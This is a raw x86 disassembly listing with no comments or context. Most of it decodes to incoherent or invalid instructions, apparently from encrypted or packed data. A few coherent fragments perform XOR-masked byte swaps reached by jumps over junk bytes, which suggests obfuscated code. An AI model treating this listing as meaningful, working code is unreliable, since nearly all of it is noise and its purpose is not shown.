  40c209:	setne  BYTE PTR [esi]
  40c20c:	jge    0x40c236
  40c20e:	jae    0x40c221
  40c210:	or     DWORD PTR [esi+edi*8],0x3b08810b
  40c217:	aaa    
  40c218:	push   cs
  40c219:	jnp    0x40c1bc
  40c21b:	sbb    eax,0x97798f25
  40c220:	xchg   ebx,eax
  40c221:	retf   0x5b5
  40c224:	push   ss
  40c225:	dec    edi
  40c226:	leave  
  40c227:	(bad)  
  40c229:	push   ebp
  40c22a:	std    
  40c22b:	fs pop ebp
  40c22d:	mov    al,0x85
  40c22f:	jmp    0xbcd2:0x6b52f497
  40c236:	repz sar BYTE PTR [ebx+0x5697bdbc],1
  40c23d:	xchg   ebx,eax
  40c23e:	mov    ds:0xaef2f395,al
  40c243:	mov    ds:0x95e7be38,al
  40c248:	push   ecx
  40c249:	outs   dx,DWORD PTR ds:[esi]
  40c24a:	jecxz  0x40c29e
  40c24c:	stc    
  40c24d:	mov    bl,0x2c
  40c24f:	mov    ch,0x35
  40c251:	mov    ch,bl
  40c253:	sub    ch,BYTE PTR [di+0x77a]
  40c258:	xor    cl,BYTE PTR [ecx+eiz*1-0x19]
  40c25c:	cwde   
  40c25d:	test   ebp,edi
  40c25f:	mov    dl,0x9d
  40c261:	push   ss
  40c262:	jg     0x40c296
  40c264:	out    dx,eax
  40c265:	push   ds
  40c266:	dec    ebp
  40c267:	push   cs
  40c268:	cmc    
  40c269:	adc    BYTE PTR [ebx+0x785a4fc9],dh
  40c26f:	sbb    al,0xd0
  40c271:	cmp    BYTE PTR [edi],ah
  40c273:	inc    esp
  40c274:	pop    eax
  40c275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c276:	in     al,dx
  40c277:	mov    edx,0xc35bbea1
  40c27c:	cdq    
  40c27d:	xchg   esp,eax
  40c27e:	(bad)  
  40c27f:	sbb    DWORD PTR ds:0xf2d9085c,esi
  40c285:	scas   al,BYTE PTR es:[edi]
  40c286:	dec    ecx
  40c287:	imul   ebp,DWORD PTR [esp+ebx*1+0x2f6a3aa4],0xbe0df1e0
  40c292:	pop    edx
  40c293:	test   al,0xf0
  40c295:	enter  0xc42e,0xda
  40c299:	jbe    0x40c2b9
  40c29b:	mov    WORD PTR [edx+0x6cb60285],gs
  40c2a1:	(bad)  [edx]
  40c2a3:	rcl    BYTE PTR [edi-0x67],1
  40c2a6:	pop    edi
  40c2a7:	mov    ds:0x9c097e65,eax
  40c2ac:	xor    BYTE PTR [esp+eax*2],ah
  40c2af:	ret    0xd352
  40c2b2:	pop    ebx
  40c2b3:	cmp    ch,dl
  40c2b5:	inc    ecx
  40c2b6:	pop    edi
  40c2b7:	mov    ch,0x3d
  40c2b9:	sbb    edi,DWORD PTR [edi-0x23]
  40c2bc:	add    bh,dl
  40c2be:	mov    bh,BYTE PTR [eax]
  40c2c0:	mov    ss,eax
  40c2c2:	or     BYTE PTR [edx],dh
  40c2c4:	mov    eax,ds:0xce24782d
  40c2c9:	pop    esp
  40c2ca:	fwait
  40c2cb:	jno    0x40c310
  40c2cd:	nop
  40c2ce:	and    ecx,DWORD PTR [eax-0x6f]
  40c2d1:	and    DWORD PTR [esi+ecx*8+0x7f4af685],ebp
  40c2d8:	ins    BYTE PTR es:[edi],dx
  40c2d9:	int    0xa8
  40c2db:	in     al,dx
  40c2dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2dd:	mov    bl,0xd
  40c2df:	mov    ebp,0xb35ede77
  40c2e4:	popf   
  40c2e5:	nop
  40c2e6:	aam    0xa7
  40c2e8:	adc    DWORD PTR [eax],ebp
  40c2ea:	mov    cl,cl
  40c2ec:	out    dx,eax
  40c2ed:	xor    eax,0x4b03777c
  40c2f2:	dec    eax
  40c2f3:	or     cl,ch
  40c2f5:	dec    edx
  40c2f6:	lds    ebx,FWORD PTR [edx-0x7894dbe1]
  40c2fc:	pop    ecx
  40c2fd:	or     eax,0xc614f424
  40c302:	mov    ah,0x6a
  40c304:	xchg   DWORD PTR [esi],eax
  40c306:	jo     0x40c330
  40c308:	scas   eax,DWORD PTR es:[edi]
  40c309:	cdq    
  40c30a:	cmp    eax,0x159aa65b
  40c30f:	adc    BYTE PTR [edi-0x67],al
  40c312:	sar    cl,cl
  40c314:	cmp    DWORD PTR [edx-0x7799a542],ebx
  40c31a:	and    edi,DWORD PTR [ebx]
  40c31c:	jmp    0xa751738
  40c321:	shl    DWORD PTR [ebx],1
  40c323:	aad    0x91
  40c325:	ins    DWORD PTR es:[edi],dx
  40c326:	rcl    BYTE PTR [ebx-0x725aca64],cl
  40c32c:	xlat   BYTE PTR ds:[ebx]
  40c32d:	adc    edi,DWORD PTR [ebx+0x3c]
  40c330:	inc    ecx
  40c331:	xor    dh,BYTE PTR [ebx]
  40c333:	std    
  40c334:	ins    DWORD PTR es:[edi],dx
  40c335:	loope  0x40c332
  40c337:	jecxz  0x40c3ae
  40c339:	aam    0x39
  40c33b:	mov    eax,0xd1713280
  40c340:	out    0xd0,eax
  40c342:	(bad)  
  40c343:	jnp    0x40c397
  40c345:	popf   
  40c346:	inc    eax
  40c347:	addr16 loope 0x40c355
  40c34a:	add    esp,DWORD PTR [edi-0x6521918d]
  40c350:	mov    esp,0xb7b0ded0
  40c355:	pushf  
  40c356:	out    dx,eax
  40c357:	pop    esi
  40c358:	jns    0x40c2eb
  40c35a:	scas   al,BYTE PTR es:[edi]
  40c35b:	imul   esp,DWORD PTR ds:0x903dff24,0xd86649c4
  40c365:	mov    ch,0x67
  40c367:	pop    ax
  40c369:	jecxz  0x40c33f
  40c36b:	clc    
  40c36c:	and    eax,DWORD PTR [esi+ecx*2+0x3459eaed]
  40c373:	adc    eax,0x7179fa52
  40c378:	push   ss
  40c379:	loope  0x40c371
  40c37b:	loopne 0x40c330
  40c37d:	xchg   ebp,eax
  40c37e:	(bad)  
  40c37f:	adc    DWORD PTR [edi],eax
  40c381:	add    eax,ebp
  40c383:	jne    0x40c331
  40c385:	rol    edi,cl
  40c387:	jp     0x40c32f
  40c389:	and    eax,0x3dbb1f67
  40c38e:	ret    0xb790
  40c391:	stc    
  40c392:	fsubr  QWORD PTR [edi+0x206d3aff]
  40c398:	call   0xc172:0xf06d7354
  40c39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a0:	aaa    
  40c3a1:	sbb    eax,0x33ec01e9
  40c3a6:	loope  0x40c3b4
  40c3a8:	jp     0x40c404
  40c3aa:	pop    ebx
  40c3ab:	mov    dh,0x34
  40c3ad:	lods   eax,DWORD PTR ds:[esi]
  40c3ae:	cmp    ecx,DWORD PTR [ecx]
  40c3b0:	push   esi
  40c3b1:	div    DWORD PTR ds:0xab009a4e
  40c3b7:	xchg   ebx,eax
  40c3b8:	(bad)  
  40c3b9:	xor    al,0x2a
  40c3bb:	int    0x9
  40c3bd:	pop    ecx
  40c3be:	(bad)  
  40c3c0:	mov    ebx,0x11824df2
  40c3c5:	dec    eax
  40c3c6:	and    al,0x21
  40c3c8:	lods   al,BYTE PTR ds:[esi]
  40c3c9:	push   esp
  40c3ca:	(bad)  
  40c3cb:	pop    esp
  40c3cc:	cli    
  40c3cd:	inc    cl
  40c3cf:	or     bl,BYTE PTR [ebp-0x3]
  40c3d2:	push   cs
  40c3d3:	jg     0x40c441
  40c3d5:	add    BYTE PTR [edi-0x636c0a07],dl
  40c3db:	in     eax,0x2e
  40c3dd:	inc    eax
  40c3de:	out    0xde,eax
  40c3e0:	xor    bl,BYTE PTR [edx-0x72]
  40c3e3:	cwde   
  40c3e4:	cs aam 0x11
  40c3e7:	dec    eax
  40c3e8:	mov    ds,WORD PTR [edi-0x7ad9ed32]
  40c3ee:	adc    eax,0xea1c9d94
  40c3f3:	push   edi
  40c3f4:	inc    ecx
  40c3f5:	cmp    esi,ecx
  40c3f7:	xor    BYTE PTR [edi+ecx*4],cl
  40c3fa:	sbb    edi,DWORD PTR ss:[ebp-0x6f7c9bfd]
  40c401:	cmp    cl,cl
  40c403:	pop    ds
  40c404:	int    0xc8
  40c406:	imul   edx,DWORD PTR [ebx-0x1e936657],0xf1a06f42
  40c410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c411:	xor    al,cl
  40c413:	arpl   sp,si
  40c415:	xchg   esi,eax
  40c416:	cli    
  40c417:	xor    BYTE PTR [eax-0x7c8ed2a9],al
  40c41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c41e:	inc    eax
  40c41f:	out    dx,eax
  40c420:	into   
  40c421:	inc    edi
  40c422:	ds jle 0x40c444
  40c425:	mov    dl,0x6d
  40c427:	cdq    
  40c428:	leave  
  40c429:	add    BYTE PTR [ebx],dl
  40c42b:	mov    DWORD PTR [edx+0x4cda5024],eax
  40c431:	sbb    dl,al
  40c433:	push   ss
  40c434:	sti    
  40c435:	retf   0xecc9
  40c438:	inc    ebp
  40c439:	cmp    eax,0x67609803
  40c43e:	popa   
  40c43f:	sub    DWORD PTR [esi],0x66ff818f
  40c445:	(bad)  
  40c446:	loop   0x40c47e
  40c448:	loop   0x40c478
  40c44a:	ret    
  40c44b:	add    al,0xe5
  40c44d:	inc    esi
  40c44e:	aam    0xb3
  40c450:	clc    
  40c451:	cmp    BYTE PTR [ecx-0x5e],bl
  40c454:	sbb    BYTE PTR ds:0x7dc96c9d,al
  40c45a:	lods   eax,DWORD PTR ds:[esi]
  40c45b:	push   ecx
  40c45c:	shl    DWORD PTR [edi-0x7d3921b8],0x16
  40c463:	dec    esi
  40c464:	sub    al,0xc3
  40c466:	pop    ds
  40c467:	sub    DWORD PTR [edi],0xfffffffb
  40c46a:	int    0x47
  40c46c:	adc    DWORD PTR [esi],eax
  40c46e:	xor    al,0x90
  40c470:	adc    dl,BYTE PTR [ecx-0x43]
  40c473:	push   es
  40c474:	scas   eax,DWORD PTR es:[edi]
  40c475:	test   al,0x44
  40c477:	pop    ebx
  40c478:	std    
  40c479:	xchg   ebx,eax
  40c47a:	in     al,dx
  40c47b:	mov    edx,0x5489520a
  40c480:	lahf   
  40c481:	int    0x21
  40c483:	cdq    
  40c484:	sub    DWORD PTR [esi],ebp
  40c486:	int3   
  40c487:	outs   dx,BYTE PTR ds:[esi]
  40c488:	pop    edx
  40c489:	loop   0x40c49d
  40c48b:	inc    ebx
  40c48c:	dec    ecx
  40c48d:	jle    0x40c50c
  40c48f:	rcl    dh,0xc
  40c492:	mov    BYTE PTR [edi],cl
  40c494:	mov    DWORD PTR [edi],eax
  40c496:	daa    
  40c497:	sahf   
  40c498:	jne    0x40c4ad
  40c49a:	mov    ds:0xef42356c,eax
  40c49f:	fcomip st,st(0)
  40c4a1:	daa    
  40c4a2:	mov    bl,0x70
  40c4a4:	push   es
  40c4a5:	pop    ebx
  40c4a6:	push   cs
  40c4a7:	xchg   edi,eax
  40c4a8:	(bad)  
  40c4a9:	push   ebp
  40c4aa:	mov    al,ds:0x6df8c31c
  40c4af:	lea    ebp,[edi+eax*4+0x11ea936d]
  40c4b6:	cmp    ecx,ebx
  40c4b8:	bound  edi,QWORD PTR [edi-0x22]
  40c4bb:	std    
  40c4bc:	mov    bh,0x21
  40c4be:	loopne 0x40c48c
  40c4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c1:	cli    
  40c4c2:	outs   dx,BYTE PTR ds:[esi]
  40c4c3:	and    al,0x8
  40c4c5:	xchg   esi,eax
  40c4c6:	jle    0x40c4dc
  40c4c8:	ret    
  40c4c9:	push   0x595bf5d
  40c4ce:	sub    DWORD PTR [eax+0x5c7fc2b3],esi
  40c4d4:	adc    eax,0x73707a6f
  40c4d9:	pop    ss
  40c4da:	fcmovbe st,st(6)
  40c4dc:	ds dec edi
  40c4de:	mov    ds:0xafe327b2,al
  40c4e3:	sbb    eax,0x176c1583
  40c4e8:	lods   al,BYTE PTR ds:[esi]
  40c4e9:	mov    al,ds:0x3c20fc5f
  40c4ee:	sub    BYTE PTR [edx],dl
  40c4f0:	add    ebx,DWORD PTR [ecx+esi*4+0x4]
  40c4f4:	pop    esp
  40c4f5:	jle    0x40c4ca
  40c4f7:	pop    eax
  40c4f8:	mov    al,0xe4
  40c4fa:	nop
  40c4fb:	sub    dh,BYTE PTR [ebx+0x7361bdcd]
  40c501:	cmp    al,ah
  40c503:	jecxz  0x40c4be
  40c505:	int    0x18
  40c507:	neg    DWORD PTR [edx-0x464a37b6]
  40c50d:	bound  esi,QWORD PTR [edi+0x41]
  40c510:	popa   
  40c511:	(bad)  [edi-0x7c989c3d]
  40c517:	(bad)  
  40c518:	ja     0x40c542
  40c51a:	fwait
  40c51b:	xchg   edx,eax
  40c51c:	push   edx
  40c51d:	rol    BYTE PTR fs:[ebx],cl
  40c520:	repnz xchg esi,eax
  40c522:	jecxz  0x40c51e
  40c524:	jmp    0x40c5a3
  40c526:	cwde   
  40c527:	pushf  
  40c528:	and    al,0x1e
  40c52a:	inc    esp
  40c52b:	dec    esi
  40c52c:	or     BYTE PTR [eax-0x4f7ca9d8],ch
  40c532:	add    DWORD PTR fs:[ecx],eax
  40c535:	(bad)  
  40c536:	cmp    dh,BYTE PTR [eax]
  40c538:	cmp    DWORD PTR [ebp+eiz*1-0x2a],ebp
  40c53c:	push   0x11
  40c53e:	repz sbb edx,edi
  40c541:	mov    edx,DWORD PTR [ebp-0x18]
  40c544:	xor    edx,eax
  40c546:	add    edx,DWORD PTR [ebp-0x14]
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0x9e69733d,si
  40c55e:	imul   edx,DWORD PTR [ebp+0x7c95975a],0x7c79ca7c
  40c568:	jl     0x40c5a5
  40c56a:	fwait
  40c56b:	and    BYTE PTR [edx],cl
  40c56d:	xchg   DWORD PTR ds:0xb23c,eax
  40c572:	popa   
  40c573:	cmp    ah,dl
  40c575:	sub    al,0xd9
  40c577:	inc    ebx
  40c578:	xor    eax,0x90f863bd
  40c57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c57e:	adc    DWORD PTR [esi-0x71],ebp
  40c581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c582:	sub    ebp,DWORD PTR [edx+0x53f28008]
  40c588:	adc    BYTE PTR [esi+0x189045c],ch
  40c58e:	dec    ebp
  40c58f:	push   ebp
  40c590:	inc    esi
  40c591:	mov    ebp,0xebbad35a
  40c596:	or     bl,cl
  40c598:	jg     0x40c569
  40c59a:	and    al,0x14
  40c59c:	not    BYTE PTR fs:[eax]
  40c59f:	cmp    ebx,DWORD PTR [ebx+0x1f]
  40c5a2:	std    
  40c5a3:	shl    BYTE PTR [ecx+0x78],cl
  40c5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5a7:	mov    ebx,DWORD PTR [esi-0x1c0153f1]
  40c5ad:	push   cs
  40c5ae:	push   0xffffffef
  40c5b0:	sbb    ebx,ecx
  40c5b2:	retf   0xb82f
  40c5b5:	ret    
  40c5b6:	push   edi
  40c5b7:	mov    bl,0xd
  40c5b9:	push   ss
  40c5ba:	retf   
  40c5bb:	pusha  
  40c5bc:	xlat   BYTE PTR ds:[ebx]
  40c5bd:	fld    TBYTE PTR [eax+0x584f2d12]
  40c5c3:	add    DWORD PTR [edx+0x5fed5043],ecx
  40c5c9:	jmp    0x40c632
  40c5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5cc:	repnz xchg ebp,eax
  40c5ce:	fst    QWORD PTR [esi]
  40c5d0:	(bad)
  40c5d4:	and    ch,bl
  40c5d6:	sub    eax,DWORD PTR [edi]
  40c5d8:	test   bl,bh
  40c5da:	lods   al,BYTE PTR ds:[esi]
  40c5db:	cmp    eax,0xbb7385c4
  40c5e0:	(bad)  
  40c5e1:	pop    eax
  40c5e2:	(bad)  [eax+0x60170685]
  40c5e8:	fcom   st(6)
  40c5ea:	in     al,0x62
  40c5ec:	imul   ebp,DWORD PTR [eax+ebx*1+0x4a],0xffffffbb
  40c5f1:	push   0x1b1d3212
  40c5f6:	mov    ah,BYTE PTR [edi]
  40c5f8:	iret   
  40c5f9:	and    BYTE PTR [edi-0x59],al
  40c5fc:	retf   0x41e9
  40c5ff:	fist   WORD PTR [ecx+0xd]
  40c602:	hlt    
  40c603:	aam    0x53
  40c605:	mov    esi,0x9c5b55b0
  40c60a:	pop    ss
  40c60b:	imul   ebx,DWORD PTR [edi],0x805c8403
  40c611:	jnp    0x40c64e
  40c613:	jae    0x40c5f9
  40c615:	popf   
  40c616:	dec    ecx
  40c617:	mov    al,ds:0xad408d11
  40c61c:	add    cl,cl
  40c61e:	dec    ecx
  40c61f:	inc    edx
  40c620:	ror    bl,0x42
  40c623:	lahf   
  40c624:	popa   
  40c625:	mov    ds:0xd9a3b09c,eax
  40c62a:	xor    BYTE PTR [esi-0xf],ch
  40c62d:	shl    bh,1
  40c62f:	je     0x40c613
  40c631:	jb     0x40c5e2
  40c633:	push   0x82cca4e3
  40c638:	loopne 0x40c689
  40c63a:	jp     0x40c65a
  40c63c:	call   0xe19:0x54d18f26
  40c643:	(bad)  
  40c644:	cld    
  40c645:	test   ebp,ebp
  40c647:	mov    ebp,0xc396a638
  40c64c:	mov    DWORD PTR ss:[ecx-0xd],0x55ec817e
  40c654:	js     0x40c620
  40c656:	inc    edx
  40c657:	xchg   esp,eax
  40c658:	icebp  
  40c659:	imul   DWORD PTR [ecx+0x50d2dc75]
  40c65f:	movntq QWORD PTR [esi],mm6
  40c662:	dec    edx
  40c663:	mov    bh,0xd0
  40c665:	test   eax,0x8f35ac68
  40c66a:	stos   DWORD PTR es:[edi],eax
  40c66b:	xor    BYTE PTR [ebp-0xeaf3735],0x5f
  40c672:	jne    0x40c62c
  40c674:	fsubr  st(5),st
  40c676:	xor    BYTE PTR [edx],ah
  40c678:	sub    DWORD PTR [ebx],edx
  40c67a:	int    0x81
  40c67c:	sti    
  40c67d:	sub    DWORD PTR [eax],esi
  40c67f:	xor    DWORD PTR [eax],0x51
  40c682:	pop    ebp
  40c683:	mov    ebp,0x54fc6d82
  40c688:	mov    al,ds:0x9f95ebb3
  40c68d:	fadd   st,st(6)
  40c68f:	xchg   ebx,eax
  40c690:	addr16 (bad) 
  40c692:	cmp    eax,0xa4a1c18f
  40c697:	jno    0x40c6df
  40c699:	jmp    0x34c0:0x947fd690
  40c6a0:	inc    ebx
  40c6a1:	add    bl,al
  40c6a3:	pop    es
  40c6a4:	aas    
  40c6a5:	sub    ecx,edi
  40c6a7:	pop    ss
  40c6a8:	add    al,0x8a
  40c6aa:	aas    
  40c6ab:	adc    DWORD PTR [edx+eiz*4],ebp
  40c6ae:	add    edi,DWORD PTR [esi-0x1059c825]
  40c6b4:	dec    ecx
  40c6b5:	or     bh,ch
  40c6b7:	loope  0x40c6e5
  40c6b9:	lock loope 0x40c728
  40c6bc:	push   cs
  40c6bd:	jns    0x40c646
  40c6bf:	inc    ebp
  40c6c0:	imul   ebp,DWORD PTR [esp+ebp*2+0x331a9fa5],0xb4611d5a
  40c6cb:	or     eax,0x3bc180d
  40c6d0:	add    al,0xf6
  40c6d2:	imul   DWORD PTR [ecx+0x151b0b71]
  40c6d8:	lds    esi,FWORD PTR [esi+0x2e2f7c06]
  40c6de:	mov    WORD PTR [edi+0x65],ds
  40c6e1:	bnd jl 0x40c70f
  40c6e4:	test   al,0xd5
  40c6e6:	mov    al,ds:0x19635412
  40c6eb:	mov    al,0xd
  40c6ed:	js     0x40c6c6
  40c6ef:	xchg   dh,cl
  40c6f1:	xlat   BYTE PTR ds:[ebx]
  40c6f2:	imul   edx,DWORD PTR [ecx],0x65
  40c6f5:	adc    DWORD PTR [edi],0xffffffa3
  40c6f8:	inc    ebp
  40c6f9:	mov    al,0x2d
  40c6fb:	fadd   QWORD PTR [edx-0x57f9898e]
  40c701:	push   esp
  40c702:	jmp    0x27f5e406
  40c707:	call   0x6015cdb4
  40c70c:	stos   DWORD PTR es:[edi],eax
  40c70d:	jmp    0x40c6b6
  40c70f:	mov    gs,WORD PTR [edi-0xd799cbf]
  40c715:	fiadd  WORD PTR [esi]
  40c717:	fwait
  40c718:	and    BYTE PTR [esi+0x5a],dl
  40c71b:	inc    esp
  40c71c:	loop   0x40c6a5
  40c71e:	ret    
  40c71f:	sbb    eax,0x61221561
  40c724:	pop    ds
  40c725:	push   ebx
  40c726:	and    DWORD PTR [ebp+0x7],ebx
  40c729:	adc    eax,0xb2bd2918
  40c72e:	shl    BYTE PTR [esi+0x632fbafd],1
  40c734:	enter  0xc459,0x29
  40c738:	mov    esi,DWORD PTR [eax-0x27ba26ac]
  40c73e:	imul   esp,DWORD PTR [ecx],0x6947e61a
  40c744:	test   bh,bl
  40c746:	test   BYTE PTR [eax+0xc8d8c62],0x28
  40c74d:	xchg   esi,edi
  40c74f:	icebp  
  40c750:	outs   dx,DWORD PTR ds:[esi]
  40c751:	xchg   ebx,eax
  40c752:	mov    edx,0xed690456
  40c757:	xor    al,0x7
  40c759:	mov    ch,0xb8
  40c75b:	hlt    
  40c75c:	(bad)  [edi-0x733bbd1]
  40c762:	sbb    bl,0xe5
  40c765:	inc    esi
  40c766:	cwde   
  40c767:	out    0xf8,al
  40c769:	dec    ebx
  40c76a:	(bad)  
  40c76b:	or     cl,ch
  40c76d:	loopne 0x40c7e8
  40c76f:	repz lahf 
  40c771:	or     al,0x92
  40c773:	xchg   BYTE PTR [ebx+0x17e36428],al
  40c779:	(bad)  
  40c77a:	mov    esp,0x38016f52
  40c77f:	imul   ecx,DWORD PTR [ecx+0x7c],0x46afcc0b
  40c786:	adc    al,0x46
  40c788:	or     eax,0xc7ab0dcf
  40c78d:	pop    ebx
  40c78e:	and    esi,edx
  40c790:	pusha  
  40c791:	fs ret 0x7735
  40c795:	jp     0x40c742
  40c797:	mov    ecx,0x21a1c281
  40c79c:	mov    bh,0x5a
  40c79e:	fld    TBYTE PTR [ebp+ebp*8-0x4d0cdaf2]
  40c7a5:	mov    ch,BYTE PTR [ebx+0x29]
  40c7a8:	cld    
  40c7a9:	fiadd  DWORD PTR [ecx+0x7e4435a8]
  40c7af:	sbb    BYTE PTR [edx+0x3a4c0213],dl
  40c7b5:	fisub  WORD PTR [ebx+0x4a40066]
  40c7bb:	bswap  edi
  40c7bd:	bound  ebp,QWORD PTR [edi+esi*2+0x7e306074]
  40c7c4:	stos   BYTE PTR es:[edi],al
  40c7c5:	cli    
  40c7c6:	xchg   ecx,eax
  40c7c7:	xor    ecx,DWORD PTR [esi]
  40c7c9:	inc    esp
  40c7ca:	call   0xbb04:0x932bbaa3
  40c7d1:	xor    cl,ch
  40c7d3:	dec    eax
  40c7d4:	call   0x75f4de2a
  40c7d9:	adc    ch,BYTE PTR [esi-0x7]
  40c7dc:	enter  0xae3e,0xe8
  40c7e0:	ds mov cl,0x91
  40c7e3:	lods   eax,DWORD PTR ds:[esi]
  40c7e4:	add    DWORD PTR [ebx],edi
  40c7e6:	daa    
  40c7e7:	jns    0x40c7ee
  40c7e9:	fisttp WORD PTR [edx+0x347f87e8]
  40c7ef:	push   0x1abf77e
  40c7f4:	or     dh,0xab
  40c7f7:	out    dx,eax
  40c7f8:	jnp    0x40c845
  40c7fa:	or     cl,BYTE PTR [eax+eax*8+0x2134124f]
  40c801:	or     DWORD PTR ss:[ebp+0x29],ebp
  40c805:	(bad)  
  40c806:	or     eax,0x6c355abd
  40c80b:	add    DWORD PTR [ecx+0x5e0d8754],ebx
  40c811:	jecxz  0x40c7ef
  40c813:	add    eax,0xaf9271cd
  40c818:	popf   
  40c819:	inc    ecx
  40c81a:	xor    ecx,ebx
  40c81c:	das    
  40c81d:	xlat   BYTE PTR ds:[ebx]
  40c81e:	enter  0xbf42,0xcf
  40c822:	sub    edx,esp
  40c824:	dec    ecx
  40c825:	jmp    0x4af34505
  40c82a:	mov    ecx,0x7c884761
  40c82f:	pop    ebp
  40c830:	ja     0x40c865
  40c832:	mov    eax,0xf7a84597
  40c837:	sbb    cl,BYTE PTR [ecx+0x5807e2ed]
  40c83d:	pop    ebx
  40c83e:	jbe    0x40c85a
  40c840:	ficom  WORD PTR [esi+esi*1+0x61f3ae33]
  40c847:	jmp    0x486794d1
  40c84c:	loopne 0x40c89b
  40c84e:	int    0x87
  40c850:	loopne 0x40c875
  40c852:	loopne 0x40c85b
  40c854:	js     0x40c80f
  40c856:	dec    esi
  40c857:	push   ebx
  40c858:	xor    BYTE PTR [edi],ah
  40c85a:	pop    eax
  40c85b:	jp     0x40c82b
  40c85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85e:	stos   BYTE PTR es:[edi],al
  40c85f:	fcom   QWORD PTR [ebp-0x554e2d32]
  40c865:	jmp    0x1170772d
  40c86a:	jge    0x40c8b5
  40c86c:	dec    esp
  40c86d:	push   ecx
  40c86e:	cmp    BYTE PTR [ebx-0x37],0x93
  40c872:	inc    esi
  40c873:	mov    dh,0x24
  40c875:	and    eax,0x89b7a0cb
  40c87a:	xchg   ecx,eax
  40c87b:	inc    esp
  40c87c:	ins    DWORD PTR es:[edi],dx
  40c87d:	cld    
  40c87e:	adc    edi,DWORD PTR [edx+0x4fec7fc1]
  40c884:	add    DWORD PTR [esi],0x23
  40c887:	cmp    dh,BYTE PTR [eax-0x37]
  40c88a:	mov    ds:0xd4b91e51,al
  40c88f:	push   0xce66cd61
  40c894:	repnz in eax,0x9d
  40c897:	sub    bl,BYTE PTR ds:0x6a61fbb3
  40c89d:	ins    BYTE PTR es:[edi],dx
  40c89e:	sbb    al,0x8b
  40c8a0:	jmp    0x40c88c
  40c8a2:	xor    edx,esi
  40c8a4:	inc    ecx
  40c8a5:	int3   
  40c8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8a7:	fsub   st(5),st
  40c8a9:	and    al,BYTE PTR [edx+0x3c181435]
  40c8af:	(bad)  
  40c8b0:	mov    bh,0x7c
  40c8b2:	loope  0x40c92f
  40c8b4:	lock and edx,DWORD PTR [eax-0x2f]
  40c8b8:	add    eax,DWORD PTR ds:0x8cd2cc47
  40c8be:	or     eax,0x9a3a948a
  40c8c3:	jb     0x40c8f7
  40c8c5:	add    BYTE PTR [eax+0x558b0f55],cl
  40c8cb:	hlt    
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	and    cl,dl
  40c925:	das    
  40c926:	retf   0x966d
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c955
  40c930:	mov    ch,0xc7
  40c932:	fmul   DWORD PTR [ecx-0xe]
  40c935:	sub    al,0x62
  40c937:	xchg   esp,eax
  40c938:	mov    cs,WORD PTR [esi-0xe9c84cd]
  40c93e:	sub    BYTE PTR [edi-0x61f0bbce],ah
  40c944:	jb     0x40c93f
  40c946:	aam    0x77
  40c948:	int3   
  40c949:	push   0x55
  40c94b:	int3   
  40c94c:	add    BYTE PTR [eax+edi*1-0x13],dh
  40c950:	cmp    dl,BYTE PTR [edi-0x57]
  40c953:	pop    edx
  40c954:	dec    edi
  40c955:	pusha  
  40c956:	das    
  40c957:	cs sub ebx,eax
  40c95a:	loop   0x40c973
  40c95c:	dec    edi
  40c95d:	fwait
  40c95e:	xor    al,0x47
  40c960:	in     eax,dx
  40c961:	test   ecx,esi
  40c963:	(bad)  
  40c964:	lods   eax,DWORD PTR ds:[esi]
  40c965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c966:	inc    ecx
  40c967:	jae    0x40c907
  40c969:	fimul  DWORD PTR [ebx]
  40c96b:	mov    ecx,gs
  40c96d:	jp     0x40c960
  40c96f:	div    BYTE PTR [eax]
  40c971:	cs dec edi
  40c973:	and    DWORD PTR [edi-0x51],edx
  40c976:	pop    ds
  40c977:	(bad)  
  40c979:	inc    esi
  40c97a:	cmp    DWORD PTR [edx*4+0x25a96da8],ecx
  40c981:	std    
  40c982:	imul   eax,esp,0xad753ede
  40c988:	ror    DWORD PTR [ecx-0x33580ce3],cl
  40c98e:	cli    
  40c98f:	or     al,0x8c
  40c991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
